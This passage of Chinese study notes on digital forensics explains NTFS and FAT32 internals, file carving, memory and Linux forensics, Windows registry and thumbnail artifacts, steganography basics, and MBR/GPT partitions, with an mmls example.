<tr><td>6-7</td><td>Number of entries in fixup array</td><td></td></tr>
<tr><td>8-15</td><td></td><td></td></tr>
<tr><td>16-17</td><td></td><td></td></tr>
<tr><td>18-19</td><td>硬链接数</td><td></td></tr>
<tr><td>20-21</td><td>第一个属性的偏移值</td><td></td></tr>
<tr><td>22-23</td><td>标识Flag，0x00表示删除，0x01表示正在使用，0x02表示目录删除，0x03表示目录正在使用</td><td></td></tr>
<tr><td>24-27</td><td>文件记录的实际长度</td><td></td></tr>
<tr><td>28-31</td><td>文件记录的分配长度</td><td></td></tr>
<tr><td>32-39</td><td></td><td></td></tr>
<tr><td>40-41</td><td></td><td></td></tr>
<tr><td>42-43</td><td></td><td></td></tr>
<tr><td>44-47</td><td></td><td></td></tr>
<tr><td>43-1023</td><td>属性和固定值</td><td></td></tr>
</tbody></table>
</div>
<p>事实上，前16个MFT entry是文件系统用来存储metadata的。0-11个是有意义的，12-15暂时保留。</p>
<div class="table-wrapper"><table><thead><tr><th>entry</th><th>file name</th><th>Description</th></tr></thead><tbody>
<tr><td>0</td><td>$MFT</td><td>主文件表</td></tr>
<tr><td>1</td><td>$MFTMirr</td><td></td></tr>
<tr><td>2</td><td>$LogFile</td><td>日志文件</td></tr>
<tr><td>5</td><td>$Root</td><td>根目录文件</td></tr>
</tbody></table>
</div>
<p>属性类型分为常驻属性和非常驻属性两种。常驻属性的内容存储在MFT中，而非常驻属性则存储在文件区。</p>
<p>$$
S= C \times(每个簇的扇区数)
$$</p>
<p>为什么知道File的Cluster还要知道File Size ？</p>
<p>File的Metadata？Permission</p>
<p>Possible to 恢复文件 ？ possible</p>
<h2 id="内存取证"><a class="header" href="#内存取证">内存取证</a></h2>
<p>内存是易失的，而且我们做的操作也会对内存造成影响。</p>
<p>比如使用top/history等命令</p>
<p>dump内存，对于Linux，可以dd /dev/mem，Windows有Windd。但是这意味着你需要信任工具链，而且使用工具的同时会修改内存。最好用硬件直接获取内存。</p>
<p>把内存dump下来。然后可以使用Volatility Framework, memparse, Foundstone系列工具进行分析。怎么对内存进行分析，找出有用的数据是难点。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fat文件系统"><a class="header" href="#fat文件系统">FAT文件系统</a></h1>
<p>这里主要介绍FAT32。FAT是一个非常简单的文件系统。来看FAT文件系统的结构：</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220305155955112.png" alt="image-20220305155955112" /></p>
<p>他分为3个部分</p>
<ul>
<li>Reserved Area</li>
<li>FAT Area</li>
<li>Data Area</li>
</ul>
<h2 id="reserved-area"><a class="header" href="#reserved-area">Reserved Area</a></h2>
<p>他又包括</p>
<ul>
<li>主引导扇区（512 字节）。结构参考《电子取证》第五章表5.1 附录A B</li>
<li>FS Information Sector</li>
<li>More Reserved Sectors</li>
</ul>
<h2 id="data-area"><a class="header" href="#data-area">Data Area</a></h2>
<p>Data Area是用来存储文件的实际内容的。</p>
<p>文件系统分配给文件的基本单元是<strong>簇cluster</strong>，而硬盘寻址的基本单元是<strong>扇区sector</strong>。Data Area被划分成簇，簇地址从2开始（也就是说Data Area的起始位置簇地址为2）。簇地址C和扇区地址S的转换关系。
$$
S=(C-2)\times(每个簇的扇区数)+(簇2的扇区地址)
$$</p>
<p>关于根目录：<strong>根目录</strong>是一个<strong>目录文件(Directory table)</strong>。对于FAT32，主引导扇区记录了根目录的第一个簇位置(0X2C处)，结合FAT Area就知道他的整个文件在哪。而对于FAT12/16来说，根目录紧跟着FAT Area</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220406083037539.png" alt="image-20220406083037539" /></p>
<p>目录，或者说文件夹，也是以一个文件，称为目录文件。<strong>目录文件</strong>包括了很多表项，每一个表项对应一个文件（也可以是子目录，目录也是文件），包括文件的名称、扩展名、元数据、第一个簇位置等信息，称为<strong>目录表项</strong>。有关目录表项的详细定义，这里不列出。下面介绍FAT32中目录表项的关键数据</p>
<ul>
<li>目录表项的0-10字节，为目录包含文件的文件名。
<ul>
<li>一共11个字节，也就是8位文件名+3位扩展名。标准的文件名只能是8.3格式的，就是8位文件名+3位扩展名。不过FAT32提供了长文件名的支持。</li>
<li>其中第0个字节还表示了文件的分配状态，如果是0xe5/0x00就表示未分配（删除文件的操作，就是把文件名的第一个字节标记为0xe5并在FAT表中把文件所有的簇号对应的项清零），0x2e表示该文件是目录文件。</li>
</ul>
</li>
<li>目录表项的0x1a-0x1b字节存储了簇地址的低2字节，0x14-0x15存储了簇地址的高2字节。</li>
<li>目录表项的0x1c-0x1f字节存储了文件的大小，对于目录来说是0。
<ul>
<li>一个文件占用的空间，肯定是簇大小的倍数（比如<code>n * CLUSTER_SIZE</code>）。不过文件的实际大小，往往不会是簇大小的倍数（比如<code>(n-1) * CLUSTER_SIZE + x</code>），这中间的差值就叫做松弛空间，可以用来隐藏信息。</li>
</ul>
</li>
</ul>
<h2 id="fat-area"><a class="header" href="#fat-area">FAT Area</a></h2>
<p>FAT的意思是File Allocation Table，这对FAT文件系统非常重要。存储文件分配表（一般来说是两个表，一个主表和一个备份，这个在主引导扇区规定）。在FAT32中，每一个表项为32位（或者说28位，高4位保留不用），<strong>表项用来记录簇状态和分配给文件的下一个簇的指针</strong>。簇从2开始编号，表项从0开始编号，表项x和簇x相对应。</p>
<ul>
<li>表项为<code>0x0000_0000</code>，表示该簇未使用。</li>
<li>表项为<code>0x0fff_fff7</code>，表示该簇损坏。</li>
<li>表项为<code>0x0fff_ffff</code>，表示该簇是文件的最后一个簇。</li>
<li>表项为其他，表示该文件下一个簇的地址。</li>
</ul>
<p>那么可以来理一下在FAT文件系统中由文件名到文件内容的查找方式。比如路径为<code>/filename</code></p>
<ol>
<li>首先，根据根目录起始簇号找到根目录的第一个簇号<code>root_0</code>。
<ol>
<li>查找<code>root_i</code>簇中所有的目录项，如果找到<code>filename</code>，那么可以获得他的第一个簇的地址。</li>
<li>如果没有找到，那么在FAT表中根据<code>root_i</code>找到下一个簇号<code>root_i+1</code>，返回第一步。（如果没有下一个簇了就说明找不到了）</li>
</ol>
</li>
<li>根据文件的第一个簇号<code>file_0</code>，在FAT表中根据<code>file_i</code>找到<code>file_i+1</code>，直到总大小超过文件大小。</li>
</ol>
<p>其实这就是一个链表的结构。</p>
<pre><code class="language-c">struct FATfile {
    char [CLASTER_SIZE] content;    // 存储在Data Area
    struct FATfile* next;   // 存储在FAT表中，以编号的形式
}
</code></pre>
<hr />
<p><a href="https://academy.cba.mit.edu/classes/networking_communications/SD/FAT.pdf">FAT spec</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="文件雕复"><a class="header" href="#文件雕复">文件雕复</a></h1>
<p><strong>文件雕复(File Carving)</strong> is the process of reassembling computer files from fragments (or data blocks) <strong>in the absence of file system metadata</strong>. 他是我们最后才应该考虑的文件恢复技术</p>
<p>文件雕复依赖于这样两个观察：</p>
<ol>
<li>很多文件都在文件的开头或结尾，有特定的magic number。</li>
<li>很多文件是连续的在磁盘中存储的，而不是被分成若干个部分。</li>
</ol>
<h2 id="bifragment-gap-carving"><a class="header" href="#bifragment-gap-carving">Bifragment Gap Carving</a></h2>
<p>对于文件并不连续的分配在磁盘上，恢复是很困难的。但是我们有BCG(Bifragment Gap Carving)算法，用来解决文件在磁盘上被分为2个连续的部分的恢复。他依赖于这样一个观察</p>
<ol>
<li>很多文件格式都存在合法性校验，比如在文件存储CRC。这就让我们可以知道自己是不是正确的恢复了文件。</li>
</ol>
<p>算法介绍，看下面的图</p>
<ul>
<li>假设我们已经知道了File Header和File Footer，那么我们就知道了最大可能的Gap</li>
<li>遍历所有可能的Gap大小，和Gap的起始点，验证文件是否通过合法性校验。</li>
</ul>
<p><img src="Basic/Secure/Forensics/../images/image-20220609103454069.png" alt="image-20220609103454069" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux取证"><a class="header" href="#linux取证">Linux取证</a></h1>
<h2 id="历史命令"><a class="header" href="#历史命令">历史命令</a></h2>
<p><code>history</code>可以查看输入的历史命令。环境变量<code>HISTFILE</code>表示了历史命令存储在哪个文件中。一般是<code>~/.bash_history</code></p>
<h2 id="syslog"><a class="header" href="#syslog">syslog</a></h2>
<p>syslog是消息日志记录的一个标准，广泛的用于UNIX、Linux中。</p>
<p>syslog协议属于一种主从式协议：syslog发送端会发送出一个小的文字消息（小于1024位）到syslog接收端。接收端通常名为“syslogd”、“syslog daemon”或syslog服务器。系统日志消息可以被以UDP协议及╱或TCP协议来发送。这些资料是以明码类型被发送。不过由于SSL加密外套（例如Stunnel、sslio或sslwrap等）并非syslog协议本身的一部分，因此可以被用来透过SSL／TLS方式提供一层加密。</p>
<p>syslog协议具体的实现有<code>syslog-ng</code>/<code>rsyslog</code>。rsyslog的配置文件保存在<code>/etc/rsyslog.conf</code>中。他是一个文本文件，其中的每一行都是一个规则</p>
<p>规则的格式为<code>selector &lt;Tab&gt; action</code>，selector描述记录和保存哪些日志，action描述如何保存日志。</p>
<p>selector使用<code>facility.priority</code>格式，facility描述发送消息的程序是什么，priority描述日志或消息的严重性级别，action可以是日志文件、终端或主机。一个例子：</p>
<pre><code>auth,authpriv.*	/var/log/auth.log
</code></pre>
<p>表示所有用户身份验证信息都被记录到/var/log/auth.log中。</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220609162216453.png" alt="image-20220609162216453" /></p>
<h2 id="proc"><a class="header" href="#proc">proc</a></h2>
<p>proc文件系统用于通过内核访问进程信息，他是存在在内存中的伪文件系统。</p>
<p>https://man7.org/linux/man-pages/man5/proc.5.html</p>
<p>https://zh.wikipedia.org/zh-cn/Procfs</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="内存取证-1"><a class="header" href="#内存取证-1">内存取证</a></h1>
<p>正确的取证顺序是先对容易失去的证据进行取证，而内存就是最容易失去的数据。</p>
<div class="table-wrapper"><table><thead><tr><th><strong>Registers, peripheral memory, caches, etc.</strong></th><th><strong>nanoseconds</strong></th></tr></thead><tbody>
<tr><td>Main Memory</td><td>nanoseconds</td></tr>
<tr><td>Network state</td><td>milliseconds</td></tr>
<tr><td>Running processes</td><td>seconds</td></tr>
<tr><td>Floppies, Hard disk, backup media, etc.</td><td>years</td></tr>
<tr><td>CD-ROMs, printouts, etc.</td><td>tens of years</td></tr>
</tbody></table>
</div>
<p>并且内存中往往有非常重要的信息<sup class="footnote-reference"><a href="#1">1</a></sup>：</p>
<ul>
<li>Running process</li>
<li>Executed console commands</li>
<li>Password in clear text</li>
<li>Unencrypted data</li>
<li>Worm/Trojan Horse/Rootkit</li>
<li>Encryption keys</li>
<li>Web caches</li>
<li>Network connection and open ports</li>
</ul>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>Todd G. Shipley and Henry R. Reeve. Collecting Evidence from a Running Computer: A Technical and Legal Primer for the Justice Communityhttp://www.search.org/files/pdf/CollectEvidenceRunComputer.pdf </p>
</div>
<p>然而对内存取证是非常困难的，你对计算机的所有操作都会影响内存。并且要从内存中分析出你想要的数据也是困难的，内存没有像文件系统一样清晰的数据结构（或者说是有的，但是你没法知道）。</p>
<p>Windows中，你可以使用Windd对内存进行dump，Linux中可以使用dd，对/dev/mem文件进行dump。然而正如上面说的，对计算机的操作是会影响内存的，并且嫌疑人电脑上的toolkit并不可信。最好是用硬件的办法dump内存，但是前提是得有硬件支持。</p>
<p>Linux查看系统状态的命令：</p>
<ul>
<li>Network tools: netstat, ping, tracert, arp, ifconfig</li>
<li>Services: service</li>
<li>Open files: lsof</li>
<li>Process: ps</li>
<li>Logged on users: who, whoami</li>
<li>How long the system has been running: uptime</li>
<li>Show who is logged on and what they are doing: w</li>
<li>Display top CPU processes/Linux tasks: top</li>
<li>Display amount of free and used memory in the system: free</li>
<li>Manipulate the history list: history</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ntfs文件系统"><a class="header" href="#ntfs文件系统">NTFS文件系统</a></h1>
<p>NTFS文件系统全称为New Techology File System。我们使用的Windows操作系统，现在都以他为默认的文件系统，如Windows7，Windows 10。他比FAT更加强大和复杂。</p>
<p>NTFS是不开源的，微软没有公开他的标准。所以只能通过逆向工程的方式去推断他的结构。</p>
<p>NTFS的总体结构如下：</p>
<p><img src="Basic/Secure/Forensics/../images/NTFS-volume-structure.gif" alt="Formatted NTFS Volume" /></p>
<ol>
<li><strong>分区引导扇区 Partition Boot Sector</strong>，包括NTFS文件系统结构的关键信息。</li>
<li><strong>数据区 Data Area</strong>，包括MFT主文件表和所有文件的数据（后三个）。</li>
</ol>
<h2 id="partition-boot-sector"><a class="header" href="#partition-boot-sector">Partition Boot Sector</a></h2>
<p>分区引导扇区的大小是一个Sector（通常就是512字节，0x200）。他的结构如下。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Byte Offset</th><th style="text-align: center">Field Length</th><th>Field Name</th></tr></thead><tbody>
<tr><td style="text-align: center">0x00</td><td style="text-align: center">3 bytes</td><td>Jump Instruction</td></tr>
<tr><td style="text-align: center">0x03</td><td style="text-align: center">LONGLONG</td><td>OEM ID</td></tr>
<tr><td style="text-align: center">0x0B</td><td style="text-align: center">25 bytes</td><td>BPB</td></tr>
<tr><td style="text-align: center">0x24</td><td style="text-align: center">48 bytes</td><td>Extended BPB</td></tr>
<tr><td style="text-align: center">0x54</td><td style="text-align: center">426 bytes</td><td>Bootstrap Code</td></tr>
<tr><td style="text-align: center">0x01FE</td><td style="text-align: center">WORD</td><td>End of Sector Marker</td></tr>
</tbody></table>
</div>
<blockquote>
<p>当我们格式化一个NTFS Volume时，会分配前16个Sector作为<code>$Boot</code> metadata 文件。事实上这16个Sector中的第一个就是Partition Boot Sector，有时也会认为<code>$Boot</code>就是Partition Boot Sector。</p>
</blockquote>
<p>关键的数据都保存在BPB和EBPB中，关键的结构如下。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">Byte Offset</th><th style="text-align: center">Field Length</th><th>Sample Value</th><th>Field Name</th></tr></thead><tbody>
<tr><td style="text-align: center">0x0B</td><td style="text-align: center">WORD</td><td>0x0002</td><td><strong>Bytes Per Sector</strong></td></tr>
<tr><td style="text-align: center">0x0D</td><td style="text-align: center">BYTE</td><td>0x08</td><td><strong>Sectors Per Cluster</strong></td></tr>
<tr><td style="text-align: center">0x30</td><td style="text-align: center">LONGLONG</td><td>0x0400000000000000</td><td><strong>Logical Cluster Number for the file $MFT</strong></td></tr>
<tr><td style="text-align: center">0x38</td><td style="text-align: center">LONGLONG</td><td>0x54FF070000000000</td><td><strong>Logical Cluster Number for the file $MFTMirr</strong></td></tr>
</tbody></table>
</div>
<p>他们可以让我们找到MFT表的位置，当我们发现MFT损坏的时候，就会去读取他的备份文件。以上表的Sample Value为例</p>
<ul>
<li>每个Sector大小为512 Byte（小端序），每个Cluster大小为8个Sector。</li>
<li>而MFT的起始Cluster为4（起始簇号是0，不像FAT奇怪的2）</li>
<li>也就是说在偏移为$4\times 8\times 512$字节的地方，我们可以读取MFT文件。</li>
</ul>
<blockquote>
<p>这里区分两个概念，Logical Cluster Number(LCN)和Virtual Cluster Number(VCN)，LCN是从文件系统开始位置的簇偏移，而VCN是从文件开始位置的簇偏移，这里在逻辑上认为一个文件占据的所有簇是连续的，但是实际上文件在物理上可能是以碎片化形式保存的。</p>
</blockquote>
<h2 id="master-file-table-mft"><a class="header" href="#master-file-table-mft">Master File Table (MFT)</a></h2>
<p>NTFS中的每一个文件在MFT中都存在<strong>一条记录 MFT Entry</strong>，MFT本身也是一个文件，可以认为MFT是一个数据库文件。</p>
<p>MFT的前16个条目为特殊的System File保留。MFT的前两个条目Entry 0和Entry 1分别是MTF本身和MFT备份。Entry 5是根目录。</p>
<div class="table-wrapper"><table><thead><tr><th>System File</th><th>File Name</th><th style="text-align: center">MFT Record</th><th>Purpose of the File</th></tr></thead><tbody>
<tr><td>Master file table</td><td>$Mft</td><td style="text-align: center">0</td><td><strong>Contains one base file record for each file and folder on an NTFS volume. If the allocation information for a file or folder is too large to fit within a single record, other file records are allocated as well.</strong></td></tr>
<tr><td>Master file table 2</td><td>$MftMirr</td><td style="text-align: center">1</td><td><strong>A duplicate image of the first four records of the MFT. This file guarantees access to the MFT in case of a single-sector failure.</strong></td></tr>
<tr><td>Root file name index</td><td>$</td><td style="text-align: center">5</td><td><strong>The root folder.</strong></td></tr>
<tr><td>Cluster bitmap</td><td>$Bitmap</td><td style="text-align: center">6</td><td>A representation of the volume showing which clusters are in use.</td></tr>
<tr><td>Boot sector</td><td>$Boot</td><td style="text-align: center">7</td><td>Includes the BPB used to mount the volume and additional bootstrap loader code used if the volume is bootable.</td></tr>
<tr><td>Bad cluster file</td><td>$BadClus</td><td style="text-align: center">8</td><td><strong>Contains bad clusters for the volume.</strong></td></tr>
</tbody></table>
</div>
<h3 id="mft-entry"><a class="header" href="#mft-entry">MFT Entry</a></h3>
<p>MFT Entry的结构是很复杂的。小文件一般会直接存储在MFT Entry中。大文件则存储在数据区的其他空间，MFT Entry中会存一些指针。来看具体结构。</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220420150926875.png" alt="image-20220420150926875" /></p>
<ul>
<li>
<p>前42个字节是固定的一些项目</p>
<ul>
<li>0-3字节是MagicNumber <code>FILE</code>，或者是坏的MFT表项的MagicNumber是<code>BAAD</code></li>
<li>20-21字节是第一个属性的偏移地址</li>
<li>22-23字节是Flag，标识文件是否删除、是目录还是普通文件。</li>
<li>24-27字节是MFT Entry的实际长度，28-31字节是MFT Entry的分配长度（一般来说是0x400=1024 bytes）。</li>
</ul>
</li>
<li>
<p>之后是很多的<strong>属性Attribute</strong>。每个属性的大小各异，所以属性中会包含自己的大小。属性分类中，一种是存储在MFT中的Resident Attribute，一个是存储在MFT之外的Non-resident Attribute(也叫Data run)。</p>
<ul>
<li>0-3字节标志了属性的类型，比如48就代表了<code>$FILE_NAME</code>属性，128代表了<code>$DATA</code>属性</li>
<li>4-7字节标志了属性的长度。</li>
<li>8字节，如果是0表示Resident Attribute，如果是1表示Non-resident Attribute。</li>
</ul>
</li>
<li>
<p>介绍一些关键的属性</p>
<ul>
<li><code>$FILE_NAME</code>属性中，存储了MAC时间戳，文件实际大小和文件分配大小，以及文件名。</li>
<li><code>$DATA</code>属性中，存储了<strong>文件的内容</strong>。你可能会好奇，那4-7字节标志属性长度，文件内容又是属性，那难道NTFS文件内容最大就4G。这个问题，我知道答案之后再来填坑。</li>
</ul>
</li>
</ul>
<blockquote>
<p>那么我们可以知道如何在NTFS文件系统中找根目录了</p>
<ul>
<li>从BPB读出MFT的逻辑地址（Partition Boot Sector的0x30-0x37字节）</li>
<li>MFT中的第五个Entry是Root，一个Entry的大小存储在Entry中，通常为1KB。</li>
</ul>
</blockquote>
<h2 id="b-tree"><a class="header" href="#b-tree">B-tree</a></h2>
<p>B-Tree是一个数据结构，平衡树。NTFS通过B-tree给文件做索引。</p>
<p>几个概念：</p>
<ul>
<li>order n: 每个节点拥有子节点的数量不超过n，并且根节点的子节点的数量在[2, n]，而非根节点的子节点数量在[ceil(n/2), n]之间。 </li>
<li>depth n: 从根节点到该节点的唯一一条路径的长度。</li>
<li>height n: 从该节点到所有子节点的路中最长路径的长度。</li>
</ul>
<p>B-Tree中所有的叶节点的depth相同，并且有序。从B-Tree中插入、删除一个节点，为了保持前述特点，都需要对树进行一定的处理。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="windows取证"><a class="header" href="#windows取证">Windows取证</a></h1>
<h2 id="回收站"><a class="header" href="#回收站">回收站</a></h2>
<p>在Windows中删除文件，其实是把文件移入了回收站。</p>
<div class="table-wrapper"><table><thead><tr><th>回收站路径</th><th>文件系统</th></tr></thead><tbody>
<tr><td>C:\Recycled</td><td>FAT filesystem</td></tr>
<tr><td>C:\Recycler</td><td>NTFS filesystem</td></tr>
</tbody></table>
</div>
<h2 id="注册表"><a class="header" href="#注册表">注册表</a></h2>
<p>Windows的注册表是一个数据库，用来配置软件。与之类比的是Linux使用单独的文本文件来存放配置信息。通过<code>regedit</code>程序我们可以查看注册表。</p>
<p>注册表由键(key)、子键(subkey)和值项(value)构成。一个键就是树状数据结构中的一个节点，而子键就是这个节点的子节点，子键也是键。一个值项则是一个键的一条属性，由名称(name)、数据类型(datatype)以及数据(data)组成。一个键可以有一个或多个值，每个值的名称各不相同，如果一个值的名称为空，则该值为该键的默认值。</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220609152912300.png" alt="image-20220609152912300" /></p>
<p>注册表的数据类型主要有以下五种，除此外还有一些其他的不常用的数据类型。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">显示类型（在编辑器中）</th><th style="text-align: center">数据类型</th><th style="text-align: center">说明</th></tr></thead><tbody>
<tr><td style="text-align: center">REG_SZ</td><td style="text-align: center">字符串</td><td style="text-align: center">文本字符串</td></tr>
<tr><td style="text-align: center">REG_BINARY</td><td style="text-align: center">二进制数</td><td style="text-align: center">不定长度的二进制值，以十六进制显示</td></tr>
<tr><td style="text-align: center">REG_DWORD</td><td style="text-align: center">双字</td><td style="text-align: center">一个 32 位的二进制值，显示为 8 位的十六进制值</td></tr>
<tr><td style="text-align: center">REG_MULTI_SZ</td><td style="text-align: center">多字符串</td><td style="text-align: center">含有多个文本值的字符串，此名来源于字符串间用 nul 分隔、结尾两个 nul</td></tr>
<tr><td style="text-align: center">REG_EXPAND_SZ</td><td style="text-align: center">可扩展字符串</td><td style="text-align: center">含有环境变量的字符串</td></tr>
</tbody></table>
</div>
<p>注册表有五个一级分支：</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220609153225937.png" alt="image-20220609153225937" /></p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: center">名称</th><th style="text-align: center">作用</th></tr></thead><tbody>
<tr><td style="text-align: center">HKEY_CLASSES_ROOT</td><td style="text-align: center">存储Windows可识别的文件类型的详细列表，以及相关联的程序。</td></tr>
<tr><td style="text-align: center">HKEY_CURRENT_USER</td><td style="text-align: center">存储当前用户设置的信息。</td></tr>
<tr><td style="text-align: center">HKEY_LOCAL_MACHINE</td><td style="text-align: center">包括安装在计算机上的硬件和软件的信息。</td></tr>
<tr><td style="text-align: center">HKEY_USERS</td><td style="text-align: center">包含使用计算机的用户的信息。</td></tr>
<tr><td style="text-align: center">HKEY_CURRENT_CONFIG</td><td style="text-align: center">这个分支包含计算机当前的硬件配置信息。</td></tr>
</tbody></table>
</div>
<h3 id="注册表取证"><a class="header" href="#注册表取证">注册表取证</a></h3>
<p>HKEY_CURRENT_USER\Software\Microsoft\Protected Storage System Provider 存储了系统保存的账号密码，不过你用<code>registry</code>命令是看不到这个键的。</p>
<p>RegRipper是一个用于注册表取证的开源工具。</p>
<h2 id="日志-1"><a class="header" href="#日志-1">日志</a></h2>
<h2 id="缩略图"><a class="header" href="#缩略图">缩略图</a></h2>
<p>Windows stores thumbnails of graphics files, and certain document and movie files, in the <strong>Thumbnail Cache file</strong>, called <strong>thumbnail cache database</strong>.</p>
<p>在XP系统中，Thumb.db会保存在每一个文件夹中。但是从Windows7开始，他集中的保存在了<code>C:\Users\&lt;Username&gt;\AppData\Local\Microsoft\Windows\Explorer</code>中。</p>
<p>要对这个文件进行分析，可以使用Vinetto。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="数据隐藏"><a class="header" href="#数据隐藏">数据隐藏</a></h1>
<h2 id="隐写"><a class="header" href="#隐写">隐写</a></h2>
<p><strong>Steganography(隐写术)</strong> is the art and science of writing hidden messages in such a way that no one, apart from the sender and intended recipient, suspects the existence of the message, a form of security through obscurity. </p>
<p>隐写和加密的区别</p>
<div class="table-wrapper"><table><thead><tr><th>技术</th><th>目的</th><th>区别</th></tr></thead><tbody>
<tr><td>隐写</td><td>为了让数据不被第三方知道</td><td>不让数据的存在被别人知道，但是如果知道了就容易解密</td></tr>
<tr><td>加密</td><td>为了让数据不被第三方使用</td><td>可以知道密文， 如果不知道密钥是无法知道明文的</td></tr>
</tbody></table>
</div>
<p>Steganalysis: 判断是否存在隐藏的信息</p>
<p>一些用于隐写的工具: Steganos, S-Tools, StegHide, JPHide, Hinderman, Camouflage, Invisible Secrets</p>
<p>常用的隐写技术</p>
<ol>
<li>利用图片像素的Least Significant Bits隐藏信息。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="文件系统取证"><a class="header" href="#文件系统取证">文件系统取证</a></h1>
<p>在电子取证中对文件系统的操作，要注意是不应该去修改原来文件系统的状态的。比如说，我们直接访问嫌疑人的电脑打开XX文件，可能就会修改文件的Access Time，这是不合适的。</p>
<p>文件系统取证，一般需要先dump分区的内容，分析出其中的文件系统类型，然后根据文件系统的特点去恢复数据。</p>
<p>一般来说，文件系统<strong>分配磁盘空间</strong>有三种方式</p>
<ul>
<li>Contiguous Allocation </li>
<li>Linked Allocation - FAT</li>
<li>Indexed Allocation - ext</li>
</ul>
<p>文件系统中的<strong>数据又可以分成五种类型</strong>，如下图</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220608235629733.png" alt="image-20220608235629733" /></p>
<p>对于不是连续分配的文件系统，肯定会逐渐产生碎片。文件系统<strong>对空闲块的分配策略</strong>又有什么呢？</p>
<ol>
<li>First available strategy: 从开头找两个可用的块</li>
<li>Next available strategy: 从上次分配的块后面开始找两个可用的块</li>
<li>Best fit strategy: 找到两个连续的可用块</li>
</ol>
<p><img src="Basic/Secure/Forensics/../images/image-20220609002028812.png" alt="image-20220609002028812" /></p>
<p>文件系统中的MAC时间戳：</p>
<ul>
<li>Modified time: 上次修改时间</li>
<li>Accessed time: 上次访问时间</li>
<li>Created time: 文件创建时间</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="硬盘分析"><a class="header" href="#硬盘分析">硬盘分析</a></h1>
<p><strong>硬盘</strong>是非常常见的存储设备，其他的存储设备包括SSD、磁带、CD等等。下面的磁盘和硬盘为同义词。如图为一个典型的磁盘结构，由一个一个盘片(platter)组成。</p>
<p><img src="Basic/Secure/Forensics/../images/10_01_DiskMechanism.jpg" alt="img" /></p>
<p>硬盘的<strong>扇区Sector</strong>是最小的可寻址块。我们有两种寻址方式</p>
<ol>
<li>CHS(Cylinder-Head-Sector 柱面-磁头-扇区)地址。这个是由硬盘的物理结构决定的。</li>
<li>LBA(逻辑块地址)。显然CHS不太方便，将每个扇区依次编号便得到了逻辑块地址。</li>
</ol>
<p><strong>磁盘分区Disk Partitioning</strong>。一个磁盘可以被划分成多个使用区域，称为<strong>分区partition</strong>，分区将磁盘分为逻辑存储单元。每个分区有自己的文件系统。“格式化”就是为分区创建文件系统的过程。</p>
<p>目前流行的分区方式有两种，DOS和GPT。</p>
<h2 id="dos分区"><a class="header" href="#dos分区">DOS分区</a></h2>
<p><strong>DOS分区（也叫MBR分区）</strong>，是一种常用的磁盘分区系统。DOS分区保留了第一个512字节的扇区，用作Master Boot Record主引导记录，格式如下。引导代码可以用来加载操作系统内核文件。</p>
<div class="table-wrapper"><table><thead><tr><th>地址范围</th><th>长度</th><th>意义</th></tr></thead><tbody>
<tr><td>0x000-0x1bd</td><td>446</td><td>引导代码区</td></tr>
<tr><td>0x1be-0x1fd</td><td>64</td><td>分区表</td></tr>
<tr><td>0x1fe-0x1ff</td><td>2</td><td>签名，0xaa55</td></tr>
</tbody></table>
</div>
<p>分区表的格式。一个项目的总长是16字节，所以最多有4项。也就是说硬盘最多只有4个<strong>主分区</strong>。不过是可以有多个逻辑分区的。</p>
<div class="table-wrapper"><table><thead><tr><th>偏移</th><th>长度</th><th>意义</th></tr></thead><tbody>
<tr><td>0x00</td><td>1</td><td>分区状态：00--&gt;非活动分区；80--&gt;活动分区； 其它数值没有意义</td></tr>
<tr><td>0x01-0x03</td><td>1</td><td>分区起始CHS</td></tr>
<tr><td>0x04</td><td>1</td><td>文件系统标志位</td></tr>
<tr><td>0x05-0x7</td><td>3</td><td>分区结束CHS</td></tr>
<tr><td>0x08</td><td>4</td><td>分区起始LBR</td></tr>
<tr><td>0x0C</td><td>4</td><td>分区总的扇区数</td></tr>
</tbody></table>
</div>
<p>因为在DOS分区中，LBR最多是32 bit，而一个扇区大小为512 bytes（也就是起始位置LBA和大小均限制在2TB内），所以DOS分区方式最大支持2TB的分区，多余的容量无法被使用。（如果你看DOS的CHS的话会觉得他只有24 bits，不过我们不管他）。</p>
<ul>
<li>如果分区互相重合，那其实是异常现象，需要仔细分析。</li>
<li>对于没有被分配到任何分区的扇区，可以用来隐藏数据。</li>
</ul>
<h3 id="一般计算机的启动过程"><a class="header" href="#一般计算机的启动过程">一般计算机的启动过程</a></h3>
<p>当我们打开计算机电源开关之后：</p>
<ol>
<li><strong>基本输入输出系统(BIOS)<strong>会触发</strong>开机自检(POST)</strong>。如果因硬件故障、键盘丢失等因素造成检测失败，计算机将停止启动。</li>
<li>如果检测通过，BIOS按照启动顺序指示计算机寻找第一个已经识别的存储设备的MBR</li>
<li>之后，MBR中的引导程序将接管启动进程，加载操作系统内核文件</li>
<li>将控制权转移给操作系统</li>
</ol>
<h2 id="gpt分区"><a class="header" href="#gpt分区">GPT分区</a></h2>
<p>相较于DOS分区，GPT是一个更好的分区而更复杂方式。支持更大的硬盘，因为64 bits LBA。</p>
<hr />
<p>可以用<code>mmls</code>对disk image进行分析。Display the partition layout of a volume system (partition tables)</p>
<pre><code class="language-bash">$ mmls thumbimage_ntfs.dd 
DOS Partition Table	
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000000096   0000000097   Unallocated
002:  000:000   0000000097   0000248319   0000248223   NTFS / exFAT (0x07)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="移动设备取证"><a class="header" href="#移动设备取证">移动设备取证</a></h1>
